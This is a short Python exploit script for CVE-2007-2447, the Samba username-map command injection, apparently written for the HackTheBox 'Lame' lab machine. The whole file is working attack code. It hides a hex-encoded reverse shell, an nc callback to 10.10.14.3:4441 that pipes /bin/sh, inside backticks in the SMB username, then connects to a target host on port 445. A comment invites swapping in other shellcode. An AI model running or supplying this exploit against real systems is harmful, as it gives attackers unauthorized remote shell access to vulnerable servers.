#!/usr/bin/python

"""
CVE-2007-2447
For HackTheBox "Lame" Machine
"""

import sys

from smb.SMBConnection import SMBConnection
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False

# Replace shellcode with your own
# mkfifo /tmp/nvbi; nc 10.10.14.3 4441 0</tmp/nvbi | /bin/sh >/tmp/nvbi 2>&1; rm /tmp/nvbi
buf =  ""
buf += "\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6e"
buf += "\x76\x62\x69\x3b\x20\x6e\x63\x20\x31\x30\x2e\x31\x30"
buf += "\x2e\x31\x34\x2e\x33\x20\x34\x34\x34\x31\x20\x30\x3c"
buf += "\x2f\x74\x6d\x70\x2f\x6e\x76\x62\x69\x20\x7c\x20\x2f"
buf += "\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74\x6d\x70\x2f"
buf += "\x6e\x76\x62\x69\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d"
buf += "\x20\x2f\x74\x6d\x70\x2f\x6e\x76\x62\x69"

username = "/=`nohup " + buf + "`"
password = ""
exploit = SMBConnection(username, password, "ABCDEFGHIJKLMNOP", "hackthebox.gr", use_ntlm_v2 = False)
assert exploit.connect(sys.argv[1], 445)
